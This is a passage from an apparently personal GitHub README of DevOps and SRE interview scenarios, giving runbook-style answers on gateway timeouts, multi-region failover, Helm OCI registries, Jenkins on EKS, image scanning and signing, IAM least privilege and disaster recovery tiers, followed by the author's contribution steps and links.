- Actual playback requests execute high-overhead operations: manifest generation (`.mpd / .m3u8`), DRM license token verification, and CDN origin segment fetches.
- The container has sufficient thread capacity to answer the 2ms health check, while all streaming worker threads are blocked waiting on slow downstream dependencies.

##### 2️⃣ Inspect ALB and Envoy Idle Timeout Race Conditions

A 504 Gateway Timeout means a proxy in the path gave up waiting for an upstream response:

- If ALB idle timeout is 60 seconds, and backend playback service manifest generation takes 62 seconds due to DRM database locks, the ALB closes the connection with 504.
- Conversely, if Envoy's route timeout (default 15s) is shorter than the client request expectation, Envoy returns 504 with response flag `UT` (Upstream Timeout).

```bash
# 1. Inspect ALB Access Logs for upstream latency and target processing time
# Fields: target_processing_time, request_processing_time, response_processing_time
cat alb-access.log | awk '{print $9, $10, $11, $13}' | grep "504"

# 2. Check Envoy upstream request timeout metrics
kubectl exec -it <playback-pod> -c istio-proxy -- \
  curl -s localhost:15000/stats | grep "upstream_rq_timeout\|upstream_cx_destroy_local"
```

##### 3️⃣ Trace the Blocking Dependency via Distributed Tracing (OpenTelemetry / Jaeger)

Inspect distributed traces for the playback session span:

- **DRM License Token Service:** Is the external Widevine/FairPlay key exchange service hitting rate limits?
- **Object Storage / S3 Egress:** Are S3 GET requests for video manifest chunks experiencing 503 SlowDown or NAT Gateway bandwidth saturation?
- **Egress Connection Pool Starvation:** Did the playback service exhaust outbound HTTP client connection pool sockets connecting to the metadata store?

##### 4️⃣ Immediate Mitigation Actions

Execute tactical containment during live incident response:

- **Graceful Degradation:** Shed non-critical calls (e.g. disable real-time viewing history and personalized bitrate recommendations) to free up playback thread pools.
- **Static Fallback Manifests:** Serve pre-computed static video manifests from edge CDN cache rather than dynamic computation.
- **Tune Keep-Alive & Timeouts:** Ensure backend idle timeouts exceed load balancer idle timeouts to eliminate silent connection drops.

#### 🎯 Key Architectural Takeaway
> A 504 error with green health checks indicates that the health check endpoint is decoupled from actual application work. The app is alive enough to ping, but deadlocked on a downstream bottleneck.

#### ⏱️ 60-Second Elevator Pitch Summary

- A 504 Gateway Timeout while health checks pass means the health endpoint is decoupled from real work: it returns 200 OK while worker threads are saturated on streaming dependencies.
- First, I inspect the ALB access log fields: if 'target_processing_time' exceeds 60s, the ALB timed out waiting on the backend. If it's 15s, an intermediate Envoy proxy timeout triggered the 504.
- Second, I pull OpenTelemetry traces for the failing playback endpoint to pinpoint the bottleneck—typically DRM license verification, S3 API throttling, or egress DB pool exhaustion.
- To mitigate immediately, we activate graceful degradation: shed personalization and analytics dependencies to reclaim worker threads, and serve pre-generated static manifests from CDN edge cache.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-208-multi-region-active-failover-in-3-weeks-without-relying-on-the-dns-layer"></a>
### 208. Multi-Region Active Failover in 3 Weeks Without Relying on the DNS Layer

**Level:** `Staff / Principal SRE / Cloud Architect` | **Category:** `General DevOps` • `Disaster Recovery & Systems Architecture` | **Type:** `Systems at Scale`

**Tags:** `Multi-Region` `Disaster Recovery` `BGP` `Anycast` `AWS Global Accelerator`

> **Interview Question:**  
> *"You’re asked to ship a multi-region failover in 3 weeks, no DNS layer allowed. Your plan?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
The requirement is clear: ship automated multi-region failover between AWS us-east-1 and us-west-2 within 3 weeks, and DNS-based routing (Route 53 latency/failover records) is explicitly prohibited. DNS is disqualified because client resolvers, enterprise proxies, and mobile ISPs frequently ignore low TTLs, caching stale IPs for hours and causing 20% to 40% of traffic to bleed into an unavailable region during an outage. We must execute failover at Layer 3/4 using Anycast BGP routing.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Ingress Routing via Anycast BGP (AWS Global Accelerator or Cloudflare)

Deploy a single global Anycast IP pair that advertises BGP routes across AWS edge locations globally:

- **AWS Global Accelerator:** Provisions static Anycast IP addresses routed over AWS's private global fiber backbone directly to Regional Application Load Balancers (ALBs) in us-east-1 and us-west-2.
- **Zero DNS Changes:** Client IP lookups always resolve to the identical Anycast IP. Failover occurs at the BGP and edge proxy routing layer in under 15 seconds without DNS propagation lag.
- **Continuous Health Checking:** Global Accelerator executes TCP/HTTP health checks from multiple edge locations against both regional endpoints.

##### 2️⃣ Data Plane: Active-Passive Multi-Region Replication (3-Week Pragmatism)

True active-active multi-master databases take months to architect. For a 3-week deadline, implement Active-Warm Standby with automated read promotion:

- **Database Tier (Aurora Global Database):** Deploy Aurora MySQL/PostgreSQL Global Database with storage-level replication (< 1 second replication lag) between primary (us-east-1) and replica (us-west-2).
- **Cache Tier:** Local ElastiCache Redis in both regions. Cache writes are localized; cache misses populate from the local Aurora replica.
- **Storage Tier:** S3 Cross-Region Replication (CRR) with Replication Time Control (RTC) guaranteeing 99.99% of objects replicated within 15 minutes.

##### 3️⃣ Automated Failover Controller (Lambda / Step Functions)

Automate regional failover execution without human manual console clicking:

- **Total Failover Time:** Global Accelerator shifts traffic in < 15 seconds; Aurora replica promotion completes in < 60 seconds. Total RTO: < 90 seconds.

```bash
# Failover automation flow:
# 1. CloudWatch synthetic canary detects regional ALB failure in us-east-1
# 2. Trigger AWS Step Function:
#    a. Dial Global Accelerator traffic dial for us-east-1 to 0%
#    b. Dial Global Accelerator traffic dial for us-west-2 to 100%
#    c. Issue API call to promote Aurora Global Database replica to standalone primary
#    d. Update Secrets Manager / Parameter Store endpoints in us-west-2
```

#### 🎯 Key Architectural Takeaway
> When DNS is disallowed and time is constrained, Anycast IP routing (AWS Global Accelerator) solves the ingress layer, while Aurora Global Database storage replication delivers sub-90-second regional promotion without multi-master complexity.

#### ⏱️ 60-Second Elevator Pitch Summary

- We avoid DNS entirely because ISP caching and ignored TTLs prevent clean failover. Instead, we front both regions with AWS Global Accelerator using static Anycast IPs routed over AWS fiber.
- Because we have only 3 weeks, active-active multi-master is unrealistic; we deploy an Active-Warm Standby architecture using Aurora Global Database, which replicates at the storage layer with sub-second lag.
- We orchestrate failover using an automated Step Function triggered by synthetic health canaries: it shifts Global Accelerator traffic dials to 100% us-west-2 in under 15 seconds, while promoting the secondary Aurora cluster to write-primary.
- The result is a robust, tested multi-region failover delivered in under 3 weeks with an RTO < 90s and RPO < 1s.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-209-enterprise-internal-helm-chart-distribution-using-oci-registries-ecr-harbor"></a>
### 209. Enterprise Internal Helm Chart Distribution Using OCI Registries (ECR/Harbor)

**Level:** `Senior DevOps / SRE` | **Category:** `Kubernetes` • `Platform Engineering & Delivery` | **Type:** `CI/CD Architecture`

**Tags:** `Kubernetes` `Helm` `OCI Registry` `Harbor` `AWS ECR`

> **Interview Question:**  
> *"How do you share Helm charts internally across multiple engineering teams?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
I package charts and publish them to an internal OCI registry (such as AWS ECR, Harbor, GHCR, or Artifactory) using semantic versioning. Teams consume the charts in their CI/CD pipelines with pinned versions, and we maintain a central changelog and JSON values schema. OCI-based sharing eliminates legacy chart repository servers and leverages our existing container registry authentication and RBAC.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Packaging & Publishing Charts to Internal OCI Registries

Modern Helm 3 treats charts as standard OCI artifacts stored alongside container images:

- **Dependency & Lint Checks:** Run `helm dependency update` and `helm lint` to ensure dependencies and templates are validated.
- **Packaging:** Package chart into a versioned tarball (e.g. `base-app-1.4.2.tgz`).
- **OCI Push:** Log in to the internal registry and push directly using the `oci://` protocol.

```bash
# Package and push chart to OCI registry
helm dependency update charts/base-app
helm lint charts/base-app
helm package charts/base-app

# Authenticate and push
helm registry login harbor.internal.example.com
helm push base-app-1.4.2.tgz oci://harbor.internal.example.com/helm
```

##### 2️⃣ Team Consumption, Version Pinning & Governance

How consumer teams integrate shared base charts into their deployment pipelines:

- **Version Pinning:** Application pipelines consume charts by specifying explicit semantic versions (e.g., `--version 1.4.2`) to prevent unexpected breaking changes.
- **Values Schema Enforcement:** Include a `values.schema.json` file in the chart to validate team-provided values during client-side rendering.
- **Automated Release Pipelines:** Use GitHub Actions / GitLab CI with semantic-release to automatically build, test, and publish chart artifacts when PRs merge to main.

```bash
# Pull and inspect remote OCI chart
helm pull oci://harbor.internal.example.com/helm/base-app --version 1.4.2

# Deploy directly from OCI registry in CI/CD
helm upgrade --install myapp oci://harbor.internal.example.com/helm/base-app \
  --version 1.4.2 -n myns -f values.yaml --create-namespace
```

#### 🎯 Key Architectural Takeaway
> Adopt Helm OCI registries (ECR, Harbor, GHCR) over legacy ChartMuseum/HTTP servers. It unifies container and chart security, simplifies access control, and enables strict semantic versioning.

#### ⏱️ 60-Second Elevator Pitch Summary

- Publish versioned Helm charts as OCI artifacts directly to internal registries like Harbor or AWS ECR.
- Enforce schema validation with values.schema.json and semantic versioning to protect downstream teams from breaking changes.
- Integrate chart consumption directly into application CI/CD pipelines using pinned oci:// registry URIs.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-210-integrating-jenkins-with-docker-kubernetes-and-aws-ecr-eks-for-cloud-native-ci-cd"></a>
### 210. Integrating Jenkins with Docker, Kubernetes, and AWS (ECR/EKS) for Cloud-Native CI/CD

**Level:** `Senior DevOps / SRE` | **Category:** `CI/CD` • `Jenkins & Pipeline Configuration` | **Type:** `CI/CD Architecture`

**Tags:** `CI/CD` `Jenkins` `Docker` `Kubernetes` `Amazon EKS`

> **Interview Question:**  
> *"How did you integrate Jenkins with Docker, Kubernetes, and AWS?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
I integrate Jenkins into the cloud-native ecosystem using three pillars: (1) Docker BuildKit/buildx for multi-architecture image compilation, (2) the Jenkins Kubernetes plugin to provision ephemeral container agents dynamically on EKS, and (3) AWS IAM role assumption via IRSA/OIDC for passwordless authentication to ECR and EKS. Artifacts are versioned by git commit SHA and promoted through environments using Helm.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Dynamic Kubernetes Agent Provisioning & Docker BuildKit

Configure Jenkins to scale build worker pods automatically in response to job queues:

- **Kubernetes Cloud Plugin:** Jenkins Master communicates with the internal K8s API server, spinning up multi-container agent pods with Kaniko or Docker-in-Docker sidecars on demand.
- **BuildKit Layer Caching:** Use Docker Buildx with remote inline cache or AWS ECR cache backends to avoid rebuilding unchanged dependencies.
- **Commit SHA Tagging:** Images are tagged with the immutable short git commit SHA (e.g., `app:abc1234`) rather than mutable tags like `latest`.

```yaml
// Declarative Jenkinsfile pipeline snippet
pipeline {
  agent {
    kubernetes {
      yaml '''
apiVersion: v1
kind: Pod
spec:
  serviceAccountName: jenkins-ecr-deployer
  containers:
  - name: kaniko
    image: gcr.io/kaniko-project/executor:debug
    command: ['sleep', '9999999']
'''
    }
  }
  stages {
    stage('Build & Push') {
      steps {
        sh '/kaniko/executor --context=dir://. --destination=123456789012.dkr.ecr.ap-south-1.amazonaws.com/api:${GIT_COMMIT:0:7}'
      }
    }
  }
}
```

##### 2️⃣ Passwordless ECR/EKS Authentication (IRSA) & Helm Release

Eliminate static AWS keys and deploy declarative workloads to EKS:

- **AWS IRSA (IAM Roles for Service Accounts):** Bind the Jenkins agent ServiceAccount to an AWS IAM Role with strictly scoped permissions for `ecr:PutImage` and EKS access.
- **Staging Automated Deployment:** Automatically trigger `helm upgrade --install` against staging EKS using values overlays.
- **Production Promotion Gate:** Gated with a manual approval stage, canary traffic routing, and automated rollback if HTTP 5xx errors spike.

```bash
# Jenkins deploying to EKS via Helm
aws eks update-kubeconfig --name prod-cluster --region ap-south-1
helm upgrade --install payment-api charts/payment-api \
  -n payments \
  --set image.tag=${GIT_COMMIT:0:7} \
  -f values-prod.yaml \
  --atomic --timeout 5m
```

#### 🎯 Key Architectural Takeaway
> Integrate Jenkins with Kubernetes using dynamic agent pod scaling, build immutable images tagged by git SHA, authenticate to AWS without static keys using IRSA, and release via Helm with --atomic flags.

#### ⏱️ 60-Second Elevator Pitch Summary

- Use the Kubernetes plugin to dynamically schedule single-use ephemeral agent pods on EKS.
- Build immutable container images tagged with git commit SHAs using BuildKit/Kaniko for speed and security.
- Authenticate seamlessly to AWS ECR and EKS using IRSA and deploy versioned Helm charts with automated rollback gates.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-211-container-image-security-aws-ecr-governance-vulnerability-scanning-signing-lifecycle"></a>
### 211. Container Image Security & AWS ECR Governance: Vulnerability Scanning, Signing & Lifecycle

**Level:** `Senior DevOps / SRE` | **Category:** `Docker` • `Docker in CI/CD` | **Type:** `Technical Deep-Dive`

**Tags:** `Docker` `AWS ECR` `Security` `Trivy` `Cosign`

> **Interview Question:**  
> *"How do you handle container image security and AWS ECR repository management?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
I enforce container security using a shift-left approach combined with registry governance: CI vulnerability scanning with Trivy/Grype, blocking critical CVEs before push, cryptographic signing with Cosign, and AWS ECR repository guardrails. In ECR, I enable Enhanced or Basic scan-on-push, enforce tag immutability to prevent overwriting production tags, configure lifecycle policies to purge untagged images, and restrict access using least-privilege IAM policies.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ CI/CD Scanning with Trivy & Cryptographic Signing with Cosign

Block vulnerabilities before images ever reach the container registry:

- **Automated Trivy Scan:** Scan the built container image in CI, setting `--exit-code 1 --severity CRITICAL,HIGH` to fail pipeline builds on unpatched vulnerabilities.
- **Cryptographic Image Signing:** Use Sigstore Cosign with AWS KMS or OIDC keyless signing to attach a digital signature to the image manifest in ECR.
- **Admission Enforcement:** Deploy Kyverno or OPA Gatekeeper in Kubernetes to reject any pod whose image lacks a verified Cosign signature.

```bash
# Scan image for critical CVEs in CI pipeline
trivy image --exit-code 1 --severity CRITICAL,HIGH \
  --ignore-unfixed 123456789012.dkr.ecr.ap-south-1.amazonaws.com/api:v1.4.0

# Cryptographically sign the image using Cosign and AWS KMS
cosign sign --key awskms:///arn:aws:kms:ap-south-1:123456789012:key/cosign-key \
  123456789012.dkr.ecr.ap-south-1.amazonaws.com/api:v1.4.0
```

##### 2️⃣ AWS ECR Tag Immutability, KMS Encryption & Lifecycle Policies

Enforce repository hygiene, data protection, and storage cost controls in AWS ECR:

- **Tag Immutability:** Enable immutable tags on production repositories so existing release tags cannot be overwritten by subsequent builds.
- **KMS Customer Managed Encryption:** Encrypt repositories using AWS KMS customer managed keys (CMKs) to satisfy compliance mandates.
- **Lifecycle Rules:** Configure automated JSON lifecycle policies to expire untagged images after 3 days and retain only the last 30 tagged production images to eliminate storage bloat.
- **Scan on Push:** Enable continuous vulnerability assessment in ECR to monitor for newly disclosed zero-day vulnerabilities in deployed images.

```bash
# Create ECR repository with Tag Immutability and KMS encryption
aws ecr create-repository --repository-name payment-api \
  --image-tag-mutability IMMUTABLE \
  --encryption-configuration encryptionType=KMS,kmsKey=arn:aws:kms:ap-south-1:123456789012:key/ecr-key \
  --image-scanning-configuration scanOnPush=true

# Apply lifecycle policy to expire untagged images after 3 days
aws ecr put-lifecycle-policy --repository-name payment-api \
  --lifecycle-policy-text '{
    "rules": [
      {"rulePriority": 1, "description": "Expire untagged images", "selection": {"tagStatus": "untagged", "countType": "sinceImagePushed", "countUnit": "days", "countNumber": 3}, "action": {"type": "expire"}},
      {"rulePriority": 2, "description": "Keep last 30 tagged", "selection": {"tagStatus": "any", "countType": "imageCountMoreThan", "countNumber": 30}, "action": {"type": "expire"}}
    ]
  }'
```

#### 🎯 Key Architectural Takeaway
> Shift security left by failing builds on critical CVEs with Trivy, sign images with Cosign, and protect AWS ECR with Tag Immutability, KMS CMKs, and automated lifecycle policies to prevent storage sprawl.

#### ⏱️ 60-Second Elevator Pitch Summary

- Block unpatched vulnerabilities in CI by scanning images with Trivy and signing manifests with Cosign.
- Enforce Tag Immutability and Scan on Push in AWS ECR to guarantee release tamper-proofing.
- Automate repository cost management using ECR lifecycle rules that expire untagged intermediate layers.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-212-multi-az-vs-multi-region-architecture-architectural-trade-offs-replication-failover"></a>
### 212. Multi-AZ vs Multi-Region Architecture: Architectural Trade-Offs, Replication & Failover

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Multi-AZ` `Multi-Region` `Architecture` `Disaster Recovery`

> **Interview Question:**  
> *"Multi-AZ vs Multi-Region — when should you use each, and how do you handle replication trade-offs?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
Multi-AZ is the default foundation for High Availability within a single AWS region, protecting against data center failures with low-latency synchronous replication (<2ms). Multi-Region protects against catastrophic regional outages and reduces latency for global end-users, but introduces immense architectural complexity: asynchronous data replication, eventual consistency trade-offs, potential data loss (RPO), split-brain failover risks, and a 2x-3x cost multiplier. I default to Multi-AZ unless strict compliance, global latency, or business RTO/RPO dictates Multi-Region.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Multi-AZ: Synchronous Replication & The HA Default

Why Multi-AZ satisfies 95% of enterprise availability requirements:

- **Low Latency (<2ms):** Availability zones are connected by high-bandwidth, redundant fiber networks, enabling synchronous write replication for relational databases (e.g. Aurora, RDS Multi-AZ).
- **Zero Data Loss (RPO = 0):** Synchronous database commits guarantee that if one data center fails, the standby instance is 100% up-to-date with zero data loss.
- **Automated Failover:** AWS managed services (ALB, RDS, EKS) handle health checks and DNS/IP failover seamlessly in 60-120 seconds without human intervention.

```bash
# Inspecting Route 53 health checks and multi-AZ resource configuration
aws rds describe-db-instances --db-instance-identifier prod-db \
  --query 'DBInstances[*].[DBInstanceIdentifier,MultiAZ,SecondaryAvailabilityZone,Status]' --output table

# Query Route 53 resource record sets
aws route53 list-resource-record-sets --hosted-zone-id Z1234567890ABC
```

##### 2️⃣ Multi-Region: Asynchronous Replication, Trade-Offs & Complexity

Navigating the engineering hurdles of true cross-region deployments:

- **Asynchronous Replication & Lag:** Physics prevents synchronous cross-region writes without 50-150ms latency penalties. Systems must tolerate eventual consistency (e.g. DynamoDB Global Tables, Aurora Global Database).
- **Data Conflicts & Split-Brain:** Active-Active architectures risk conflicting simultaneous writes in both regions. Requires UUID primary keys, deterministic last-write-wins, or CRDTs.
- **Failover Orchestration:** Active-Passive (Warm Standby/Pilot Light) requires automated Route 53 Application Recovery Controller (ARC) routing controls and tested runbooks to promote replicas safely without corrupting data.
- **Cost & Data Transfer Multiplier:** Inter-region data transfer fees, duplicated idle compute, and cross-region monitoring significantly increase operational expenditure.

```bash
# Checking cross-region replication status on S3 and DynamoDB
aws s3api get-bucket-replication --bucket prod-media-assets
aws dynamodb describe-table --table-name prod-orders \
  --query 'Table.GlobalTableVersion' --output text
```

#### 🎯 Key Architectural Takeaway
> Default to Multi-AZ for synchronous replication, RPO=0, and automated failover at low cost. Adopt Multi-Region only when justified by regulatory requirements or global latency, and prepare for asynchronous consistency and failover orchestration complexity.

#### ⏱️ 60-Second Elevator Pitch Summary

- Use Multi-AZ as the default: sub-2ms latency enables synchronous DB replication with RPO=0 and automated failover.
- Reserve Multi-Region for catastrophic regional disaster recovery or global latency reduction due to asynchronous data replication hurdles.
- Mitigate Multi-Region split-brain risks using AWS Application Recovery Controller (ARC) and DynamoDB Global Tables.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-213-enforcing-least-privilege-iam-at-scale-permission-boundaries-oidc-access-analyzer"></a>
### 213. Enforcing Least-Privilege IAM at Scale: Permission Boundaries, OIDC & Access Analyzer

**Level:** `Senior DevOps / SRE` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Technical Deep-Dive`

**Tags:** `AWS` `IAM` `Security` `Permission Boundaries` `SCP`

> **Interview Question:**  
> *"How do you enforce least-privilege IAM across enterprise AWS environments?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
Least privilege means granting only the minimum necessary actions on specific resource ARNs with strict condition keys, and completely eliminating long-lived access keys. In our enterprise AWS environment, I enforce this using a multi-tiered security model: Service Control Policies (SCPs) at the AWS Organizations level to define hard guardrails, IAM Permission Boundaries for delegated developer roles to prevent privilege escalation, OIDC for passwordless CI/CD authentication, and continuous pruning of unused permissions using IAM Access Analyzer and CloudTrail.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Organization SCPs & IAM Permission Boundaries

Prevent privilege escalation and enforce organizational perimeter guardrails:

- **Service Control Policies (SCPs):** Deny critical operations across all member accounts (e.g. disabling CloudTrail, leaving the Organization, or creating IAM users outside us-east-1).
- **IAM Permission Boundaries:** Allow developers to create IAM roles for Lambda/ECS without permitting them to grant administrative privileges or bypass company security controls.
- **Eliminate Long-Lived Static Keys:** Enforce STS assume-role via GitHub Actions / GitLab CI OIDC federation and AWS IAM Identity Center (SSO) for human engineers.

```bash
# Permission Boundary policy snippet attached to developer-created roles
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:*",
        "dynamodb:*",
        "sqs:*"
      ],
      "Resource": "*"
    },
    {
      "Effect": "Deny",
      "Action": [
        "iam:*",
        "organizations:*"
      ],
      "Resource": "*"
    }
  ]
}
```

##### 2️⃣ Auditing Privilege Creep with Access Analyzer & Policy Simulation

Detect over-permissive access and safely down-scope production IAM policies:

- **IAM Access Analyzer:** Continuously monitor resources (S3 buckets, KMS keys, IAM roles) shared outside your trusted AWS organization.
- **Service Last Accessed Data:** Review CloudTrail and Access Advisor data to identify permissions granted but never used in 90 days, then down-scope the policy.
- **Policy Simulator:** Test complex policies against proposed actions before applying changes to production.

```bash
# Generate report of unused services for a specific role
aws iam generate-service-last-accessed-details \
  --arn arn:aws:iam::123456789012:role/jenkins-deployer

# Retrieve accessed details job output
aws iam get-service-last-accessed-details --job-id <job-id>

# List public and cross-account findings via Access Analyzer
aws accessanalyzer list-findings --analyzer-arn <analyzer-arn>
```

#### 🎯 Key Architectural Takeaway
> Never use static access keys or wildcard Action:* permissions. Enforce organizational guardrails with SCPs, delegate role creation safely with IAM Permission Boundaries, and eliminate unused permissions using Access Analyzer.

#### ⏱️ 60-Second Elevator Pitch Summary

- Replace static IAM keys with short-lived STS tokens using OIDC role assumption for CI/CD pipelines.
- Attach IAM Permission Boundaries to delegated developer roles to permanently block privilege escalation.
- Continuously audit and down-scope permissions using AWS IAM Access Analyzer and CloudTrail event telemetry.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-214-disaster-recovery-architecture-rto-rpo-cloud-cost-optimization-in-aws"></a>
### 214. Disaster Recovery Architecture (RTO/RPO) & Cloud Cost Optimization in AWS

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Disaster Recovery` `RTO` `RPO` `FinOps`

> **Interview Question:**  
> *"How do you design disaster recovery and balance RTO/RPO targets against AWS costs?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
I design disaster recovery by first categorizing systems by business criticality and establishing non-negotiable RTO (Recovery Time Objective) and RPO (Recovery Point Objective) targets. I select the most cost-effective DR pattern: Backup & Restore for non-critical services (hours RTO/RPO), Pilot Light for medium workloads, Warm Standby for mission-critical apps (minutes RTO), and Multi-Site Active/Active only when seconds count. For cost optimization, I ensure we do not over-provision standby infrastructure by leveraging IaC, automated snapshot lifecycles, and auto-scaling.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ The 4 AWS Disaster Recovery Tiers & Cost Trade-Offs

Aligning technical architecture with business recovery objectives:

- **Backup & Restore (Lowest Cost):** Data is continuously backed up to S3 with cross-region replication (CRR). Zero compute is running in the DR region until a disaster strikes (RTO: 4-24h, RPO: 1-24h).
- **Pilot Light (Low Cost):** Core data stores are continuously replicated (e.g. RDS Read Replica or DynamoDB Global Tables). Minimal core infra exists in DR; app compute is spun up via Terraform/ASGs upon failover (RTO: 10-60 min, RPO: minutes).
- **Warm Standby (Medium/High Cost):** A scaled-down, functional production replica runs 24/7 in the secondary region. During disaster, Route 53 switches traffic and the Auto Scaling Group scales out to 100% capacity (RTO: minutes, RPO: seconds).
- **Multi-Site Active/Active (Highest Cost):** Full production capacity operates concurrently across multiple regions with global load balancing (RTO: zero, RPO: zero/sub-second).

```bash
# Inspecting RDS automated cross-region snapshot copy and replication
aws rds describe-db-instances --db-instance-identifier prod-db \
  --query 'DBInstances[*].[DBInstanceIdentifier,ReadReplicaDBInstanceIdentifiers]' --output json

# Verifying S3 cross-region replication configuration
aws s3api get-bucket-replication --bucket prod-primary-backups
```

##### 2️⃣ FinOps Guardrails & Standby Cost Controls

Prevent secondary DR environments from doubling your cloud bill unnecessarily:

- **Minimal Idle Compute:** In Pilot Light / Warm Standby, keep EC2/EKS compute at minimum viable size (e.g., 2 small instances) and use Terraform to scale up only when triggered.
- **Snapshot Lifecycle Policies:** Transition older EBS snapshots and S3 backups to S3 Glacier Flexible / Deep Archive after 30 days.
- **Automated Testing (Game Days):** Run quarterly DR rehearsals to measure actual recovery time against RTO/RPO baselines and verify runbooks.

```bash
# Inspect AWS Cost Explorer monthly spend and DR bucket lifecycle
aws ce get-cost-and-usage --time-period Start=2026-08-01,End=2026-09-01 \
  --granularity MONTHLY --metrics UnblendedCost \
  --group-by Type=DIMENSION,Key=SERVICE

# Check S3 lifecycle configuration for backup tiering to Glacier
aws s3api get-bucket-lifecycle-configuration --bucket prod-backup-vault
```

#### 🎯 Key Architectural Takeaway
> Never default to expensive Active-Active DR. Classify workloads by business impact, select the appropriate tier (Backup & Restore vs Pilot Light vs Warm Standby), and keep standby compute minimal until failover.

#### ⏱️ 60-Second Elevator Pitch Summary

- Tier workloads by business impact to establish realistic RTO and RPO targets before designing infrastructure.
- Choose Pilot Light or Warm Standby to achieve sub-hour recovery times without paying for duplicate 24/7 compute fleets.
- Automate snapshot retention to S3 Glacier and conduct regular Game Day rehearsals to validate failover automation.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

## 🤝 Contributing & Community

Have an alternative battle-tested runbook or an edge-case to add? PRs and scenario submissions are warmly welcomed!

1. Fork this repository
2. Create a feature branch (`git checkout -b feature/new-runbook`)
3. Commit your changes (`git commit -m 'Add production triage runbook'`)
4. Push to branch (`git push origin feature/new-runbook`)
5. Open a Pull Request

---

## 🌐 Naveed Kumbhar Digital & Engineering Ecosystem

This repository is part of the open technology and cloud architecture network curated by [Naveed Kumbhar](https://naveedkumbhar.com):

| Platform | URL | Scope & Technical Focus |
| :--- | :--- | :--- |
| 👨‍💻 **Primary Architect Hub** | [`naveedkumbhar.com`](https://naveedkumbhar.com) | Official portfolio of Naveed Kumbhar — Senior DevOps, Cloud & SRE Architect. |
| 🧠 **DevOps Production Hub** | [`interview.naveedkumbhar.com`](https://interview.naveedkumbhar.com) | 998+ real-world production incident scenarios, diagnostic runbooks, and candidate storytelling models. |
| ☸️ **Kubernetes Mastery** | [`k8s.naveedkumbhar.com`](https://k8s.naveedkumbhar.com) | 24 hands-on modules, interactive quizzes (70% pass gate), session tracking, and minikube sandboxes. |
| 📝 **Engineering Deep Dives** | [`blog.naveedkumbhar.com`](https://blog.naveedkumbhar.com) | Production post-mortems, high-availability cluster designs, and modern infrastructure guides. |
| ⚡ **The Platform Dispatch** | [`news.naveedkumbhar.com`](https://news.naveedkumbhar.com) | Free bi-weekly newsletter covering real production incidents, cloud architecture, and automation. |
| 🧰 **DevOps Lab & Cloud Tools** | [`tools.naveedkumbhar.com`](https://tools.naveedkumbhar.com) | Interactive YAML validators, CIDR subnet calculators, and IAM security policy builders. |
| 🌳 **Genealogy Digital Archive** | [`shajjra.com`](https://shajjra.com) | Flagship 45-generation living family tree archive and interactive genealogical canvas. |


---

### 🔗 Connect with Naveed Ahmed
- 🌐 **Portfolio & Systems:** https://naveedkumbhar.com
- ✍️ **Tech Blog:** https://blog.naveedkumbhar.com
- 💼 **LinkedIn:** [linkedin.com/in/naveedkumbhar](https://pk.linkedin.com/in/naveedkumbhar)
- 🐦 **X (Twitter):** [@naveedkumbhar](https://x.com/naveedkumbhar)
- 🧵 **Threads:** [@naveedkumbhar](https://threads.net/@naveedkumbhar)
- 📸 **Instagram:** [@naveedkumbhar](https://instagram.com/naveedkumbhar)
- 📘 **Facebook:** [KiLL3rMiNd](https://www.facebook.com/KiLL3rMiNd)
- 💬 **WhatsApp Direct:** [@naveedkumbhar](https://wa.me/naveedkumbhar)
- 🐙 **GitHub:** https://github.com/naveedkumbhar


---

## 📜 License

This repository is open-source and released under the [MIT License](LICENSE).  

Copyright © 2026 [Naveed Ahmed](https://naveedkumbhar.com). All rights reserved.
